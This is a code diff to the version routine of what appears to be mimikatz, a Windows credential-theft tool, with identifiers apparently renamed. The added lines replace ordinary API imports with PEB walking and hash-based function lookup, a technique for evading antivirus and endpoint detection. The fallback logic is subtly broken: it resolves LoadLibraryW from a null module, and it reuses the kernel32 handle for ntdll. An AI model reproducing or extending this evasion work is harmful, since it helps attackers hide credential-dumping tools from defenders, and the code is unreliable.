@@ -4,6 +4,7 @@
 	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
 */
 #include "kuhl_m_standard.h"
+#include "..\mimilib\api_resolver.h"
 
 const KUHL_M_C kuhl_m_c_standard[] = {
 	//{kuhl_m_standard_test,		L"test",	L"Test routine (you don\'t want to see this !)"},
@@ -93,6 +94,7 @@ const wchar_t *version_libs[] = {
 	L"kdcsvc.dll", L"cryptdll.dll", L"lsadb.dll", L"saMsrv.dll", L"rsaenh.dll", L"ncrypt.dll", L"ncryptprov.dll",
 	L"eventlog.dll", L"wevtsvc.dll", L"termsrv.dll",
 };
+
 NTSTATUS kuhl_m_standard_version(int argc, wchar_t * argv[])
 {
 	DWORD i, len;
@@ -103,11 +105,24 @@ NTSTATUS kuhl_m_standard_version(int argc, wchar_t * argv[])
 	wchar_t *system, *cabname, pathc[MAX_PATH];
 	DWORD dwSystem;
 	char *pFile, *acabname;
+
 	BOOL isWow64
 	#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
 	 = TRUE;
 	NTSTATUS status;
 	HMODULE hModule;
+
+	//nuevo
+	HMODULE hKernel32Base = GetModuleBaseFromPEB(L"kernel32.dll");
+	customLoadLibraryW fLoadLibraryW = (customLoadLibraryW)getFunctionByHash(hKernel32Base, H_LoadLibraryW);
+
+	if (!hKernel32Base)
+		hKernel32Base = fLoadLibraryW(L"kernel32.dll"); // fallback
+
+	customGetProcAddress fGetProcAddress =
+		(customGetProcAddress)getFunctionByHash(hKernel32Base, H_GetProcAddress);
+
+
 	PNTQUERYSYSTEMINFORMATIONEX pNtQuerySystemInformationEx;
 	SYSTEM_ISOLATED_USER_MODE_INFORMATION iumi = {TRUE, FALSE /* 0 */};
 	#else
@@ -123,9 +138,12 @@ NTSTATUS kuhl_m_standard_version(int argc, wchar_t * argv[])
 			);
 	}
 	#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
-	if((NoTKaZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10) && (hModule = GetModuleHandle(L"ntdll")))
+	hKernel32Base = GetModuleBaseFromPEB(L"ntdll");//nuevo
+	//if((NoTKaZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10) && (hModule = GetModuleHandle(L"ntdll")))
+	if ((NoTKaZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_10) && (hModule = hKernel32Base))
 	{
-		if(pNtQuerySystemInformationEx = (PNTQUERYSYSTEMINFORMATIONEX) GetProcAddress(hModule, "NtQuerySystemInformationEx"))
+		//if(pNtQuerySystemInformationEx = (PNTQUERYSYSTEMINFORMATIONEX) GetProcAddress(hModule, "NtQuerySystemInformationEx"))
+		if (pNtQuerySystemInformationEx = (PNTQUERYSYSTEMINFORMATIONEX)fGetProcAddress(hModule, "NtQuerySystemInformationEx"))
 		{
 			status = pNtQuerySystemInformationEx(SystemIsolatedUserModeInformation, &iumi, 8, &iumi, sizeof(iumi), NULL);
 			if(NT_SUCCESS(status))
